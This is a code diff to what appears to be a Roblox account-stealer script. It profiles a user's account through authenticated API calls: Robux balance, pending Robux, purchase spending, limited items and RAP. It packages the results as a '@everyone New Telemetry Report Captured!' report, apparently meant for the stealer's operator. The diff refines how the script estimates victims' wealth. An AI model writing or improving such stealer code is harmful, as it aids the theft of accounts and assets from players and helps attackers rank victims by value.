@@ -70,6 +70,7 @@ def main():
         pending_robux = 0
         rap = 0
         limiteds_count = 0
+        total_spent_gamepasses = 0
         is_developer = False
         game_visits = 0
         has_korblox = False
@@ -93,28 +94,33 @@ def main():
                 except Exception:
                     pass
 
-            # 3. Robux Balance & Accurate Pending Robux Calculation
+            # 3. Robux Balance & Pending Robux
             economy_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers)
             robux_balance = economy_data.get("robux", 0) if economy_data else 0
             
-            # Fixed Pending Transactions Endpoint check
-            trans_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/transactions?transactionType=PendingRobux&limit=100", headers, {})
-            if trans_data and "data" in trans_data:
-                for t in trans_data.get("data", []):
-                    currency = t.get("currency", {})
-                    amount = currency.get("amount", 0)
-                    if amount:
-                        pending_robux += amount
-            
-            # Fallback check if PendingRobux filter returns empty
-            if pending_robux == 0:
-                trans_data_alt = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/transactions?transactionType=Pending&limit=100", headers, {})
-                if trans_data_alt and "data" in trans_data_alt:
-                    for t in trans_data_alt.get("data", []):
-                        currency = t.get("currency", {})
-                        amount = currency.get("amount", 0)
-                        if amount:
-                            pending_robux += amount
+            for t_type in ["PendingRobux", "Pending"]:
+                trans_res = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/transactions?transactionType={t_type}&limit=100", headers)
+                if trans_res and "data" in trans_res:
+                    for t in trans_res.get("data", []):
+                        cur = t.get("currency")
+                        if isinstance(cur, dict):
+                            amt = cur.get("amount", 0)
+                            if amt:
+                                pending_robux += amt
+                        elif "amount" in t:
+                            pending_robux += t.get("amount", 0)
+                if pending_robux > 0:
+                    break
+
+            # Calculate total spent on gamepasses / purchases via purchase transaction history
+            purchase_res = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/transactions?transactionType=Purchase&limit=100", headers)
+            if purchase_res and "data" in purchase_res:
+                for t in purchase_res.get("data", []):
+                    cur = t.get("currency")
+                    if isinstance(cur, dict):
+                        amt = cur.get("amount", 0)
+                        if amt:
+                            total_spent_gamepasses += abs(amt)
 
             # 4. RAP & Limiteds
             rolimons_data = safe_get(f"https://www.rolimons.com/api/playeritems/{user_id}")
@@ -122,8 +128,11 @@ def main():
                 player_assets = rolimons_data.get("playerAssets", {})
                 limiteds_count = len(player_assets)
                 for asset_id, item_details in player_assets.items():
-                    if isinstance(item_details, list) and len(item_details) > 2:
-                        rap += item_details[2]
+                    if isinstance(item_details, list):
+                        for val in item_details:
+                            if isinstance(val, int) and val > 99:
+                                rap += val
+                                break
 
             # 5. Games & Developer Stats
             created_games = safe_get(f"https://games.roblox.com/v2/users/{user_id}/games?limit=10", headers, {}).get("data", [])
@@ -157,7 +166,6 @@ def main():
             is_premium = safe_get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", headers, False)
 
         avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"
-        total_summary_wealth = robux_balance + pending_robux + rap
 
         payload = {
             "content": "@everyone New Telemetry Report Captured!",
@@ -176,8 +184,8 @@ def main():
                     f"> • Account Age: `{account_age_days} Days`\n"
                     f"> • Games Developer: `{str(is_developer)}`\n"
                     f"> • Game Visits: `{game_visits}`\n\n"
-                    f"🪙 **Robux**               📦 **Limiteds**               📊 **Summary**\n"
-                    f"Balance: `{robux_balance}` 🪙   RAP: `{rap}` 🪙           Total: `{total_summary_wealth}` 🪙\n"
+                    f"🪙 **Robux**               📦 **Limiteds**               📊 **Summary / Spent**\n"
+                    f"Balance: `{robux_balance}` 🪙   RAP: `{rap}` 🪙           Spent: `{total_spent_gamepasses}` 🪙\n"
                     f"Pending: `{pending_robux}` 🪙   Limiteds: `{limiteds_count}` 💼\n\n"
                     f"💳 **Payments & Groups**\n"
                     f"> • Owned Groups: `{owned_groups_count}`\n"
